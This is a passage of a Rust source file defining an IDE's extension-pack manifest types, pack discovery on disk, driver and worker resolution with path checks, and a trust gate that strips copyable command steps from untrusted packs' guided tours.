//! RAD **extension system** (ADR 0007) — the pluggable backbone for polyglot
//! authoring (ADR 0008) and GUI app projects (ADR 0009).
//!
//! An extension is an npm package named `nano-ide-ext-*` (`nano-ide-lang-*`
//! and `nano-ide-app-*` are the two specialisations) carrying a single
//! `nano-ide.ext.json` manifest. The host reads the manifest as **declared
//! data** — nothing is `eval`'d — and uses it to drive three seams:
//!
//! * the editor grammar map (which Monaco language a file extension gets);
//! * the project scaffolder (which starter templates exist, see [`super::projects`]);
//! * the run/compile supervisor (which on-machine toolchain runs/compiles a project).
//!
//! First-party packs (`deno`, `rust`, `deno-gui`) ship **built in** so the
//! console works offline with zero installs and existing Deno projects are
//! unchanged. Third-party packs install into `<workspace>/extensions/<pkg>/`.
//!
//! Toolchain commands run on the user's machine, so the default is allowlist +
//! consent ([`TrustStore`]): per-extension *approve always* plus a global
//! *yolo* mode, both off by default.

use std::collections::BTreeSet;
use std::path::PathBuf;

use serde::{Deserialize, Serialize};

use super::workspace;

/// Which IDE seams a pack drives.
#[derive(Clone, Copy, PartialEq, Eq, Debug, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum ExtKind {
    /// A language pack: file types/grammar + a toolchain (`nano-ide-lang-*`).
    Lang,
    /// An output/runtime pack: project templates + compile/run profile
    /// (`nano-ide-app-*`).
    App,
    /// A complete example app shipped under `appDir`, copied into a new
    /// project (`nano-ide-example-*`).
    Example,
    /// A console colour-theme pack: one or more themes declared in the
    /// manifest as design-token values (`nano-ide-theme-*`). Pure data — no
    /// toolchain, no code.
    Theme,
    /// A trigger-source pack: contributes one or more trigger source **kinds**
    /// (`nano-ide-trigger-*`, ADR 0025 §6). Its driver runs out-of-process and
    /// emits over the trigger ingress; the pack only *declares* the kinds it
    /// provides in `triggerSources[]` (declared data — no `eval`).
    Trigger,
}

/// One trigger source **kind** a pack contributes (ADR 0025 §6). This is the
/// marketplace extensibility record: it declares that a `type` string exists,
/// how the runtime is fed (`transport`), and the config fields the console
/// should render. The runtime owns the inbox/dispatch; the pack's driver only
/// produces events over the ingress.
#[derive(Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct TriggerSourceSpec {
    /// The `type` string a manifest trigger uses (e.g. `imap`, `mqtt`).
    pub kind: String,
    /// Human label for the console source picker.
    #[serde(default)]
    pub display_name: Option<String>,
    /// How the runtime receives this source's events. Only `webhook` (the
    /// universal ingress) is honoured in v1; the field is forward-declared so a
    /// pack states its contract explicitly.
    #[serde(default)]
    pub transport: SourceTransport,
    /// Config fields the console renders for a trigger of this kind.
    #[serde(default)]
    pub config_fields: Vec<ConfigField>,
    /// Pack-relative path to the out-of-process driver entrypoint (a Node/Deno
    /// `.ts`/`.js`/`.mjs` file). When present, the runtime **auto-launches and
    /// supervises** the driver while an App with a trigger of this `kind` runs
    /// (ADR 0025 phase 4): one child process per such trigger, restarted with
    /// backoff on crash, killed when the App stops. Absent = a declaration-only
    /// source whose driver is run out-of-band (it still emits over the ingress).
    #[serde(default)]
    pub driver: Option<String>,
}

/// How a pack source's events reach the runtime (ADR 0025 §6).
#[derive(Clone, Copy, PartialEq, Eq, Debug, Serialize, Deserialize, Default)]
#[serde(rename_all = "lowercase")]
pub enum SourceTransport {
    /// The pack driver POSTs each event to the trigger ingress (the universal
    /// emit endpoint). The only transport wired in v1.
    #[default]
    Webhook,
}

/// One **worker** a connector pack contributes — the outbound/compute edge of
/// the I/O surface (ADR 0050, amending ADR 0033 §4). Where a [`TriggerSourceSpec`]
/// is the *inbound* edge (external event → engine), a worker is the *outbound*
/// edge (an engine job → an external effect, e.g. "post a Slack message").
///
/// The [`worker_type`](WorkerSpec::worker_type) is the design→runtime **seam**:
/// it must equal the `zeebe:taskDefinition:type` of the element template (an
/// [`ExtManifest::components`] entry) this worker backs, so a task dragged from
/// the palette resolves to a running worker. The worker is **long-lived**
/// (subscribes by its type, Zeebe-style via `@nanobpm/worker`'s `defineWorker`)
/// and, when it ships an [`entry`](WorkerSpec::entry), the runtime
/// **auto-launches + supervises** it — one child process per enabled worker,
/// restarted with backoff on crash, killed when the App stops (ADR 0050 §4,
/// reusing the ADR 0025 phase-4 driver supervisor).
#[derive(Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct WorkerSpec {
    /// The BPMN job type this worker serves. MUST equal the backing element
    /// template's `zeebe:taskDefinition:type` (the design→runtime seam). Serialised
    /// as `type` (a Rust keyword, hence the rename).
    #[serde(rename = "type")]
    pub worker_type: String,
    /// Pack-relative entrypoint (a Node/Deno `.ts`/`.js`/`.mjs`) calling
    /// `@nanobpm/worker`'s `defineWorker`. When present, the runtime launches +
    /// supervises it while an App that enables this worker runs; absent = a
    /// declaration-only worker run out-of-band. Mirrors [`TriggerSourceSpec::driver`].
    #[serde(default)]
    pub entry: Option<String>,
    /// Human label for the console.
    #[serde(default)]
    pub display_name: Option<String>,
    /// Max concurrent in-flight jobs (maps to `defineWorker`'s `maxParallelJobs`).
    #[serde(default)]
    pub max_parallel_jobs: Option<u32>,
    /// Config fields surfaced per-connector in the project config surface (e.g.
    /// the shared API token); defaults are env pointers, never inline secrets
    /// (ADR 0027 §5).
    #[serde(default)]
    pub config_fields: Vec<ConfigField>,
}

/// One console colour theme a `kind: "theme"` pack contributes. `tokens` maps
/// the console's design-token vocabulary (see console/src/theme/themes.ts
/// TOKEN_KEYS — "app", "panel", "accent", …) to CSS colours; unknown keys are
/// ignored client-side, missing keys fall back to the base `appearance`.
#[derive(Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct ThemeSpec {
    /// Stable id, unique across packs (e.g. "nord-dark").
    pub id: String,
    /// Human-facing name shown in the theme picker.
    pub label: String,
    /// Base palette the tokens override: "light" or "dark".
    pub appearance: String,
    /// Design-token name -> CSS colour.
    #[serde(default)]
    pub tokens: std::collections::BTreeMap<String, String>,
}

/// Editor profile for one file extension.
#[derive(Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct FileType {
    /// File extension including the dot, e.g. `.rs`.
    pub ext: String,
    /// Monaco language id used for highlighting; the editor lazy-loads it only
    /// when a matching file is opened.
    pub monaco_lang: String,
}

/// One completion item a pack offers for its language (see [`LangIntellisense`]).
/// The console has a real language service only for TS/JS; other languages get
/// this curated, SDK-derived data instead. Read as opaque data and forwarded to
/// the console verbatim.
#[derive(Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct CompletionSpec {
    /// Text shown in the completion list.
    pub label: String,
    /// Monaco `CompletionItemKind` name (e.g. "method", "struct"); the console
    /// maps it. Defaults to "value" client-side when absent.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub kind: Option<String>,
    /// Text inserted on accept. Defaults to `label`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub insert_text: Option<String>,
    /// When true, `insertText` is a Monaco snippet (`${1:name}` placeholders).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub snippet: Option<bool>,
    /// Short right-aligned signature/type.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub detail: Option<String>,
    /// Markdown documentation shown in the details flyout.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub documentation: Option<String>,
}

/// A hover card shown when the pointer rests on `symbol` (whole-word match).
#[derive(Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct HoverSpec {
    pub symbol: String,
    /// Markdown rendered in the hover card.
    pub contents: String,
}

/// One parameter within a [`SignatureSpec`].
#[derive(Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct SignatureParam {
    pub label: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub documentation: Option<String>,
}

/// One function/method signature surfaced by signature help.
#[derive(Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct SignatureSpec {
    /// Identifier that, when followed by `(`, triggers this help.
    pub trigger: String,
    /// Full signature line shown in the popup.
    pub label: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub documentation: Option<String>,
    #[serde(default)]
    pub parameters: Vec<SignatureParam>,
}

/// IntelliSense data a lang pack ships for one Monaco language. The console
/// registers one provider per `monacoLang` and feeds it every pack's entries —
/// no in-browser language server required. Read as data, forwarded verbatim.
#[derive(Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct LangIntellisense {
    /// Monaco language id these entries apply to (e.g. "csharp", "rust").
    pub monaco_lang: String,
    /// Extra characters that reopen the completion popup (e.g. ["."]).
    #[serde(default)]
    pub trigger_characters: Vec<String>,
    #[serde(default)]
    pub completions: Vec<CompletionSpec>,
    #[serde(default)]
    pub hovers: Vec<HoverSpec>,
    #[serde(default)]
    pub signatures: Vec<SignatureSpec>,
}

/// One named way to run/compile the same project — used by packs whose
/// example is a matrix (e.g. `example-java-throughput` has four
/// transport/profile combos over one Java source). The Console offers
/// these in a Run/Target dropdown; the picked id is persisted per project.
///
/// **Env merging:** `env` extends (and, on key conflict, overrides) the
/// project-level environment when the config is spawned.
///
/// **Trust:** each config's `run`/`compile` argv is snapshotted into the
/// project on scaffold — trust is granted per scaffolding pack id, same
/// model as the flat `run`/`compile`.
#[derive(Clone, Default, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct RunConfig {
    /// Stable id, unique within a pack (e.g. `"stock-rest"`).
    pub id: String,
    /// Human label shown in the picker (e.g. `"Camunda 8 · REST"`).
    pub label: String,
    /// If true and no `activeRunConfig` is set on the project, this one wins.
    /// At most one per pack should be flagged; extras are ignored deterministically
    /// (first one wins in pack order).
    #[serde(default)]
    pub default: bool,
    /// Shell-style argv to run this config. Empty falls back to the toolchain's
    /// top-level `run`.
    #[serde(default)]
    pub run: Vec<String>,
    /// Shell-style argv to compile this config. Empty falls back to the
    /// toolchain's top-level `compile`.
    #[serde(default)]
    pub compile: Vec<String>,
    /// Extra environment variables set on spawn — overrides project env on key
    /// conflict.
    #[serde(default)]
    pub env: std::collections::BTreeMap<String, String>,
}

/// On-machine toolchain the supervisor drives. Commands run on the user's
/// machine and are gated by [`TrustStore`].
#[derive(Clone, Default, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct Toolchain {
    /// Probe argv proving the toolchain is installed (e.g. `cargo --version`).
    /// Empty for the built-in Deno pack (handled internally).
    #[serde(default)]
    pub detect: Vec<String>,
    /// Shell-style argv to run the project (cwd = project dir). Empty => use the
    /// built-in Deno runner. Serves as a fallback when the active run config's
    /// `run` argv is empty (per [`RunConfig`] semantics).
    #[serde(default)]
    pub run: Vec<String>,
    /// Shell-style argv to compile the project. Empty => Deno compile. Serves
    /// as a fallback when the active run config's `compile` argv is empty.
    #[serde(default)]
    pub compile: Vec<String>,
    /// Cross-compile target triples this toolchain offers.
    #[serde(default)]
    pub targets: Vec<String>,
    /// Named run configurations (see [`RunConfig`]). When present, the Console
    /// surfaces them in a Run/Target dropdown and the supervisor prefers them
    /// over the top-level `run`/`compile`.
    #[serde(default)]
    pub run_configs: Vec<RunConfig>,
    /// Official, OS-aware install instructions for this toolchain, surfaced in the
    /// IDE config panel when the `detect` probe fails. Empty for the built-in Deno
    /// pack (whose runtime is reported separately as a first-class dependency).
    #[serde(default)]
    pub install_url: Option<String>,
    /// One-line, actionable hint shown when the toolchain is missing.
    #[serde(default)]
    pub install_hint: Option<String>,
}

/// A configuration field a pack contributes to the IDE config panel. Read-only
/// for now (surfaced for visibility); packs declare the knobs they honour so the
/// panel can grow without console changes. `value` is resolved from the named
/// environment variable when `env` is set.
#[derive(Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct ConfigField {
    /// Stable key within the pack.
    pub key: String,
    /// Human-facing label.
    pub label: String,
    /// What the field controls.
    #[serde(default)]
    pub description: Option<String>,
    /// Environment variable this field reads its current value from, if any.
    #[serde(default)]
    pub env: Option<String>,
    /// Documented default when unset.
    #[serde(default)]
    pub default: Option<String>,
}

/// A scaffold template a pack contributes.
#[derive(Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct TemplateSpec {
    pub id: String,
    pub label: String,
    /// One-line description for the New Project template card. Older packs
    /// instead cram "Title — description" into `label`; the template menu
    /// splits that on the em-dash as a fallback (see `project_templates`).
    #[serde(default)]
    pub description: Option<String>,
    /// Language pack id this template's project uses, when it differs from
    /// what the pack implies (lang packs → the pack id; app/example packs →
    /// `requires[0]`, else "deno"). Drives the card's language icon AND the
    /// scaffolded project's `lang`.
    #[serde(default)]
    pub lang: Option<String>,
}

/// A named gate from the console's shared precondition library (ADR 0049 §3).
///
/// A pack ships data, never code, so it cannot supply the predicate functions the
/// console's own journeys use — it names one of these instead and the console
/// resolves it against `lib/tour/preconditions.ts`. Deliberately a closed set: an
/// open expression language here would be a second, weaker copy of the
/// precondition library and would drift from it.
#[derive(Clone, Copy, Debug, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "camelCase")]
// The shared `Has` prefix is the point, not accidental repetition: these variants
// serialize to exactly the names the console exports from
// `lib/tour/preconditions.ts` (`hasJsRuntime`, `hasProject`, …), so a pack author
// reading either side sees one vocabulary. Renaming the variants to satisfy the
// lint would put a translation layer between the manifest and the library it
// names — a drift surface in place of a style nit.
#[allow(clippy::enum_variant_names)]
pub enum TourGate {
    /// Node or Deno is present, so Run can actually start something.
    HasJsRuntime,
    /// At least one project exists.
    HasProject,
    /// More than one node — the cluster views show something meaningful.
    HasCluster,
    /// Traces have been captured.
    HasTraces,
}

/// Which affordance a tour step renders as. Mirrors the console's `Step` union.
#[derive(Clone, Copy, Debug, Serialize, Deserialize, PartialEq, Eq, Default)]
#[serde(rename_all = "camelCase")]
pub enum TourStepKind {
    /// Highlights a `data-tour` anchor named by `selector`.
    #[default]
    Spotlight,
    /// Anchorless, centered framing.
    Note,
    /// Hands off to a terminal command or URL carried in `copy`.
    Handoff,
}

/// One step of a pack-contributed journey.
///
/// A wide struct rather than a tagged enum, because a third-party manifest should
/// fail *softly*: a step with a field that does not apply to its kind is dropped
/// by the console adapter, not turned into a parse error that would silently cost
/// the pack its templates and toolchain too (`template_source` tolerantly skips a
/// manifest it cannot parse). Structural validation lives in exactly one place —
/// the console adapter that builds the real `Journey` — so this side stays a
/// carrier, like `themes` and `intellisense`.
#[derive(Clone, Debug, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct TourStepSpec {
    /// Stable across edits — the analytics key.
    pub id: String,
    #[serde(default)]
    pub kind: TourStepKind,
    pub title: String,
    pub body: String,
    /// Absolute console path to navigate to before showing the step.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub route: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub precondition: Option<TourGate>,
    /// Shown instead when `precondition` resolves to "repair".
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub repair: Option<Box<TourStepSpec>>,
    #[serde(default, skip_serializing_if = "std::ops::Not::not")]
    pub optional: bool,
    /// `spotlight`: the `data-tour` anchor to highlight.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub selector: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub side: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub align: Option<String>,
    /// `handoff`: the command or URL offered for copying. Never executed — the
    /// console renders it as inert text, and for an untrusted pack
    /// `sanitize_untrusted_step` drops handoff steps and clears this field on any
    /// surviving step, so an untrusted pack's command never reaches the client.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub copy: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub copy_label: Option<String>,
    /// `handoff`: auto-advance once an external worker is seen polling this job
    /// type. The only verification a pack can declare, because it is the only one
    /// expressible without code.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub verify_polling_job_type: Option<String>,
}

/// A guided journey a pack contributes (ADR 0049 §7).
///
/// This is what makes onboarding scale with the pack ecosystem instead of living
/// in a hardcoded list in the console: a pack that adds a capability can teach it.
#[derive(Clone, Debug, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct TourSpec {
    pub id: String,
    pub title: String,
    /// One line for the journey-picker card.
    pub blurb: String,
    /// Console profiles this journey is offered in (`studio`, `observe`). Empty
    /// means studio only — the conservative default, since most pack capabilities
    /// are authoring surfaces the operator build does not ship.
    #[serde(default)]
    pub profiles: Vec<String>,
    /// Journey-level gates: not offered at all unless every one is satisfied.
    /// A pack journey is additionally never offered unless its pack is installed,
    /// which falls out of it being a pack journey.
    #[serde(default)]
    pub preconditions: Vec<TourGate>,
    pub steps: Vec<TourStepSpec>,
    /// What must actually have happened for the journey to have worked. Absent
    /// means the journey is orientation only — the console then records
    /// completion without claiming an outcome, exactly as its own overview
    /// journey does.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub success_when: Option<TourGate>,
}

/// Remove everything an untrusted pack must not put in front of a user as a
/// trustworthy command, recursively.
///
/// A handoff's `copy` is a command the console invites the user to paste into a
/// shell. Nothing is ever executed by the console — the runner renders it with
/// `textContent` — but "inert in the UI" is not a reason to let an untrusted pack
/// put arbitrary text where a user has been told to expect a trustworthy command.
/// So the gate is: **spotlight and note steps from any installed pack; handoff
/// steps only from a trusted one.**
///
/// Enforced here, on the server, rather than in the console: trust lives in the
/// trust store next to this code, and stripping before the payload is built means
/// an untrusted pack's command string never reaches the client at all. A journey
/// left with no steps is dropped entirely rather than offered as an empty card.
pub fn visible_tours(m: &ExtManifest, trusted: bool) -> Vec<TourSpec> {
    m.tours
        .iter()
        .filter_map(|t| {
            let steps: Vec<TourStepSpec> = if trusted {
                t.steps.clone()
            } else {
                t.steps
                    .iter()
                    .cloned()
                    .filter_map(sanitize_untrusted_step)
                    .collect()
            };
            // A journey left with no steps is dropped rather than offered as an
            // empty card — on both paths, so a trusted pack that ships `steps: []`
            // is treated the same as one left empty by the trust gate.
            if steps.is_empty() {
                return None;
            }
            Some(TourSpec { steps, ..t.clone() })
        })
        .collect()
}

/// Sanitize one step from an untrusted pack, recursively.
///
/// The trust posture is that an untrusted pack's *command string never reaches
/// the client at all* — so it is not enough to drop top-level `handoff` steps:
///
/// - A `handoff` step is dropped whole (`None`) wherever it appears.
/// - A surviving `note`/`spotlight` step has its handoff-only fields (`copy`,
///   `copy_label`, `verify_polling_job_type`) cleared, because a non-handoff kind
///   carrying a `copy` string is exactly the smuggling path the gate must close.
/// - The `repair` substitution is a full step the console will render in place of
///   this one, so it is sanitized by the same rules; a `repair` that was a
///   handoff is removed, leaving the parent without a substitution.
fn sanitize_untrusted_step(mut s: TourStepSpec) -> Option<TourStepSpec> {
    if s.kind == TourStepKind::Handoff {
        return None;
    }
    s.copy = None;
    s.copy_label = None;
    s.verify_polling_job_type = None;
    s.repair = s
        .repair
        .and_then(|r| sanitize_untrusted_step(*r).map(Box::new));
    Some(s)
}

/// The `nano-ide.ext.json` manifest, read as data.
#[derive(Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct ExtManifest {
    pub id: String,
    pub kind: ExtKind,
    pub display_name: String,
    /// Optional pack icon: an inline SVG XML string (preferred) or a data:/http:
    /// URL. Lang packs supply this so the Console can badge project cards with a
    /// language icon. Built-in packs embed a small brand glyph below.
    #[serde(default)]
    pub icon: Option<String>,
    #[serde(default)]
    pub file_types: Vec<FileType>,
    #[serde(default)]
    pub templates: Vec<TemplateSpec>,
    #[serde(default)]
    pub toolchain: Toolchain,
    /// example packs: lang pack ids required to build/run this example.
    #[serde(default)]
    pub requires: Vec<String>,
    /// example packs: subdir holding the ready-to-copy project.
    #[serde(default)]
    pub app_dir: Option<String>,
    /// example packs: one-line description for the picker.
    #[serde(default)]
    pub summary: Option<String>,
    /// Whether this pack is bundled in the binary (cannot be removed).
    #[serde(default)]
    pub builtin: bool,
    /// Config fields this pack contributes to the IDE config panel (read-only).
    #[serde(default)]
    pub config_fields: Vec<ConfigField>,
    /// Console colour themes this pack contributes (theme packs).
    #[serde(default)]
    pub themes: Vec<ThemeSpec>,
    /// SDK-derived Monaco IntelliSense (completions/hovers/signatures) this pack
    /// contributes, one entry per `monacoLang`. Optional; forwarded to the
    /// console which registers providers per language.
    #[serde(default)]
    pub intellisense: Vec<LangIntellisense>,
    /// Component element templates this pack contributes (ADR 0033 §4): a list
    /// of pack-relative paths to Zeebe element-template JSON files (each holding
    /// a single template or an array). The host reads + parses them and forwards
    /// the resolved templates to the console, which merges them **under** the
    /// project's own components (project wins on an id collision) to drive the
    /// BPMN palette — the installable-component-library / Delphi-VCL axis.
    #[serde(default)]
    pub components: Vec<String>,
    /// Trigger source **kinds** this pack contributes (ADR 0025 §6). Each entry
    /// registers a `type` string so a manifest trigger can use it and the
    /// console/validation recognise it; the pack's out-of-process driver emits
    /// events over the trigger ingress. This is the `nano-ide-trigger-*` axis.
    #[serde(default)]
    pub trigger_sources: Vec<TriggerSourceSpec>,
    /// Worker **types** this pack contributes (ADR 0050 §4): the outbound edge.
    /// Each entry declares a job `type` (the design→runtime seam with a
    /// [`components`](ExtManifest::components) element template) and, optionally,
    /// an `entry` the runtime auto-launches + supervises. This is the
    /// `nano-ide-connector-*` axis, symmetric to `trigger_sources`.
    #[serde(default)]
    pub workers: Vec<WorkerSpec>,
    /// Guided journeys this pack contributes (ADR 0049 §7). Surfaced to the
    /// console through [`visible_tours`], which strips `handoff` steps from
    /// untrusted packs. `#[serde(default)]` so every manifest predating this
    /// field keeps parsing unchanged — a pack in the wild must never break.
    #[serde(default)]
    pub tours: Vec<TourSpec>,
}

/// Built-in language-pack icons: theme-robust lettermark tiles (a brand-coloured
/// rounded square with a white glyph) rendered as an `<img>` on project cards.
/// A colored tile stays legible on both the light and dark console themes (an
/// `<img>`-loaded SVG can't inherit `currentColor`). Published packs may ship
/// their own richer SVG via `nano-ide.ext.json`'s `icon`.
const ICON_DENO: &str = r##"<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><rect width="24" height="24" rx="4" fill="#3178C6"/><text x="12" y="16.5" font-family="Helvetica,Arial,sans-serif" font-size="10" font-weight="700" fill="#fff" text-anchor="middle">TS</text></svg>"##;

/// The built-in first-party packs — always available, offline, unremovable.
/// Deno is the legacy lang+app runtime (empty toolchain => internal Deno path).
pub fn builtin_extensions() -> Vec<ExtManifest> {
    vec![
        ExtManifest {
            id: "deno".into(),
            kind: ExtKind::Lang,
            display_name: "Deno (TypeScript)".into(),
            icon: Some(ICON_DENO.into()),
            file_types: vec![
                FileType {
                    ext: ".ts".into(),
                    monaco_lang: "typescript".into(),
                },
                FileType {
                    ext: ".js".into(),
                    monaco_lang: "javascript".into(),
                },
            ],
            templates: vec![],
            toolchain: Toolchain::default(),
            requires: vec![],
            app_dir: None,
            summary: None,
            builtin: true,
            config_fields: vec![ConfigField {
                key: "denoBin".into(),
                label: "Deno binary".into(),
                description: Some(
                    "Path to the Deno runtime, used only to compile a project to a standalone binary (`deno compile`). Auto-resolved from PATH / ~/.deno/bin when unset.".into(),
                ),
                env: Some("NANOBPMN_DENO_BIN".into()),
                default: Some("deno (on PATH)".into()),
            }],
            themes: vec![],
            intellisense: vec![],
            components: vec![],
            trigger_sources: vec![],
            workers: vec![],
            tours: vec![],
        },
        ExtManifest {
            id: "deno-gui".into(),
            kind: ExtKind::App,
            display_name: "Deno GUI app".into(),
            icon: None,
            file_types: vec![],
            templates: vec![TemplateSpec {
                id: "gui-starter".into(),
                label: "GUI app".into(),
                description: Some("Served UI binary (Deno.serve)".into()),
                lang: None,
            }],
            toolchain: Toolchain::default(),
            requires: vec![],
            app_dir: None,
            summary: None,
            builtin: true,
            config_fields: vec![],
            themes: vec![],
            intellisense: vec![],
            components: vec![],
            trigger_sources: vec![],
            workers: vec![],
            tours: vec![],
        },
    ]
}

/// `<workspace>/extensions` — installed third-party packs + trust store.
pub fn extensions_root() -> PathBuf {
    match std::env::var("NANOBPMN_EXTENSIONS_DIR") {
        Ok(d) if !d.is_empty() => PathBuf::from(d),
        _ => workspace::workspace_dir().join("extensions"),
    }
}

/// The installed-pack directories under [`extensions_root`], sorted by path so
/// the on-disk scan order is deterministic. `read_dir` yields entries in an
/// arbitrary, platform/filesystem-dependent order, which would make every
/// "first-pack-wins" resolver ([`all_extensions`], [`trigger_driver`],
/// [`worker_driver`], …) nondeterministic; sorting gives one stable resolution
/// order. Returns empty when the root is missing or unreadable.
fn pack_dirs() -> Vec<PathBuf> {
    let Ok(rd) = std::fs::read_dir(extensions_root()) else {
        return Vec::new();
    };
    let mut dirs: Vec<PathBuf> = rd.flatten().map(|e| e.path()).collect();
    dirs.sort();
    dirs
}

fn manifest_name() -> &'static str {
    "nano-ide.ext.json"
}

/// Every extension the console knows: built-ins plus installed packs (built-ins
/// take precedence on id collision).
pub fn all_extensions() -> Vec<ExtManifest> {
    let mut out = builtin_extensions();
    let seen: BTreeSet<String> = out.iter().map(|e| e.id.clone()).collect();
    for base in pack_dirs() {
        let mf = base.join(manifest_name());
        if let Ok(txt) = std::fs::read_to_string(&mf)
            && let Ok(m) = serde_json::from_str::<ExtManifest>(&txt)
            && !seen.contains(&m.id)
        {
            out.push(m);
        }
    }
    out
}

/// Resolve the lang pack for a project's `lang` id (default "deno").
pub fn lang_pack(id: &str) -> Option<ExtManifest> {
    all_extensions()
        .into_iter()
        .find(|e| e.kind == ExtKind::Lang && e.id == id)
}

/// Every trigger source **kind** any installed pack contributes (ADR 0025 §6) —
/// the union the runtime registry ([`super::trigger_sources::known_kinds`])
/// folds together with the compiled-in core kinds. Later duplicate declarations
/// of the same `kind` are ignored (first pack wins).
pub fn all_trigger_sources() -> Vec<TriggerSourceSpec> {
    let mut out: Vec<TriggerSourceSpec> = Vec::new();
    let mut seen: BTreeSet<String> = BTreeSet::new();
    for ext in all_extensions() {
        for spec in ext.trigger_sources {
            if seen.insert(spec.kind.clone()) {
                out.push(spec);
            }
        }
    }
    out
}

/// An installed pack's out-of-process trigger driver, resolved on disk (ADR
/// 0025 phase 4). The runtime launches [`entry`](TriggerDriver::entry) with
/// [`dir`](TriggerDriver::dir) as the working directory.
pub struct TriggerDriver {
    /// The pack's directory — the driver's working dir (so its bundled
    /// `node_modules` / imports resolve).
    pub dir: PathBuf,
    /// The driver entrypoint, pack-relative (e.g. `driver.ts`).
    pub entry: String,
}

/// Resolve the on-disk driver for a pack-contributed source `kind` (ADR 0025
/// §6 / phase 4). Returns `None` for a core kind, an unknown kind, a pack that
/// declares the kind but no `driver` (declaration-only — run out-of-band), or a
/// path-escaping / missing driver file. First matching pack wins, mirroring
/// [`all_trigger_sources`]'s first-wins dedup.
pub fn trigger_driver(kind: &str) -> Option<TriggerDriver> {
    for base in pack_dirs() {
        let Ok(txt) = std::fs::read_to_string(base.join(manifest_name())) else {
            continue;
        };
        let Ok(m) = serde_json::from_str::<ExtManifest>(&txt) else {
            continue;
        };
        let Some(spec) = m.trigger_sources.iter().find(|s| s.kind == kind) else {
            continue;
        };
        let driver = spec.driver.as_deref().filter(|d| !d.is_empty())?;
        let path = safe_pack_path(&base, driver)?;
        if !path.is_file() {
            return None;
        }
        return Some(TriggerDriver {
            dir: base,
            entry: driver.to_string(),
        });
    }
    None
}

/// An installed pack's out-of-process worker entry, resolved on disk (ADR 0050
/// §4). Symmetric to [`TriggerDriver`]: the runtime launches
/// [`entry`](WorkerDriver::entry) with [`dir`](WorkerDriver::dir) as the working
/// directory (so the pack's bundled imports resolve).
pub struct WorkerDriver {
    /// The pack's directory — the worker's working dir.
    pub dir: PathBuf,
    /// The worker entrypoint, pack-relative (e.g. `worker.ts`).
    pub entry: String,
}

/// Resolve the on-disk worker entry for a pack-contributed job `worker_type`
/// (ADR 0050 §4). Returns `None` for an unknown type, a pack that declares the
/// type but no `entry` (declaration-only — run out-of-band), or a path-escaping
/// / missing entry file. First matching pack wins, mirroring [`trigger_driver`].
pub fn worker_driver(worker_type: &str) -> Option<WorkerDriver> {
    for base in pack_dirs() {
        let Ok(txt) = std::fs::read_to_string(base.join(manifest_name())) else {
            continue;
        };
        let Ok(m) = serde_json::from_str::<ExtManifest>(&txt) else {
            continue;
        };
        let Some(spec) = m.workers.iter().find(|w| w.worker_type == worker_type) else {
            continue;
        };
        let worker_entry = spec.entry.as_deref().filter(|e| !e.is_empty())?;
        let path = safe_pack_path(&base, worker_entry)?;
        if !path.is_file() {
            return None;
        }
        return Some(WorkerDriver {
            dir: base,
            entry: worker_entry.to_string(),
        });
    }
    None
}

/// Resolve any installed extension (lang/app/example/theme) by manifest id.
/// Used for the trust check on a project's snapshotted toolchain (approving
/// `embedded-jvm` covers Run/Compile on projects it scaffolded).
pub fn find_ext(id: &str) -> Option<ExtManifest> {
    all_extensions().into_iter().find(|e| e.id == id)
}

/// Best-effort version of the pack whose manifest id is `ext_id`, read from
/// its bundled `package.json`. Returns `None` for built-in packs (no npm
/// tarball) or when the pack dir isn't found. Used as the `scaffoldedFrom.
/// version` breadcrumb on a project — never as a run-time gate.
pub fn pack_version(ext_id: &str) -> Option<String> {
    for base in pack_dirs() {
        let Ok(txt) = std::fs::read_to_string(base.join(manifest_name())) else {
            continue;
        };
        let Ok(m) = serde_json::from_str::<ExtManifest>(&txt) else {
            continue;
        };
        if m.id != ext_id {
            continue;
        }
        let pkg = std::fs::read_to_string(base.join("package.json")).ok()?;
        let v: serde_json::Value = serde_json::from_str(&pkg).ok()?;
        return v
            .get("version")
            .and_then(|x| x.as_str())
            .filter(|s| !s.is_empty())
            .map(String::from);
    }
    None
}

/// Reads the element templates contributed by the installed pack `ext_id` (ADR
/// 0033 §4): resolves each of its manifest `components` paths against the pack
/// dir, parses the JSON (a single template or an array), and returns every
/// element-template-looking entry (a string `id` + a non-empty `appliesTo`).
/// Path-escaping paths, missing files, and malformed JSON are skipped so a bad
